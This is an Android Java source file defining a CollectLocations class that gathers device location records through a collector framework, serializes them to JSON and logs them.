package com.xaviar.collect.location;

import java.util.Collection;
import java.util.List;

import android.content.Context;
import android.util.Log;

import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;

import flexjson.JSONSerializer;

public class CollectLocations extends ThreadCollector implements ICollector {

	private  static String name = "CollectLocations";
	private static final String TAG = name;
	
	

	public CollectLocations(String genericData) {
		this.genericData = genericData;
	}
	
	public CollectLocations() {
		setName(CollectLocations.name);
	}


	public CollectLocations(Context ctx) {
		setContext(ctx);
	}

	@Override
	protected String getAllData() {
		Log.d(TAG,"Enter Locations getAllData()");
		genericData = LocationUtil.getAllLocationGeneric(ctx);       
		return genericData;
	}
	
	
	protected String getAllDataStub() {
		Log.d(TAG,"Enter Locations getAllData()");
		List<Location> allLocation = LocationUtil.getAllLocationStub(ctx);
       genericData =  translateContactEntityToGeneric(allLocation);		
		return genericData;
	}
	
	private String translateContactEntityToGeneric(List<Location> allLocation) {
		Log.d(TAG,"Enter translateContactEntityToGeneric()");
		int size = 0;
		if (allLocation != null)
		{
		 size = allLocation.size();
		 }
		String ret = toJsonArray(allLocation);
		Log.d(TAG,"ret:" + ret);
		
		Log.d(TAG,"Num of contacts entry:" + size);
		return ret;
	}
	
	@Override
	public String getHolderKey() {
		return DataHolder.LOCATION_EVENT;
	}
	
	public static String toJsonArray(Collection<Location> collection) {
		   return new JSONSerializer().exclude("*.class").serialize(collection);
		}

}

